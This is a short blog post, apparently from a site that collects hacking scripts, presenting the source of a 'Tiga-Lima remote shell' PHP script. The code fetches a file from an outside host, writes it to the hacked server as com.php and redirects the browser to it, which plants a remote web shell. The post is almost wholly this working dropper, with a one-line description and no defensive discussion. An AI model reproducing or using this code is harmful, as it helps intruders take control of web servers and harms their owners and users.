---
id: 62
title: Tiga-Lima remote shell
author: admin
layout: post
guid: http://hackingscripts.com/?p=62
permalink: /tiga-lima-remote-shell/
categories:
  - PHP
  - Tiga-Lima
tags:
  - PHP
  - Tiga-Lima
---
This is a very simple script that attempts to write the contents of a remote file (presumably some sort of hack script) to a local file on the hacked server.

### Tiga-Lima remote shell source code

{% highlight php %}<?php
$namafile="com.php";
$file = fopen($namafile ,'w+');
$fa=file_get_contents('http://www.aliggroup.com/upload/log.txt');
$write = fwrite ($file ,$fa);
header ("location:com.php");
?>
{% endhighlight %}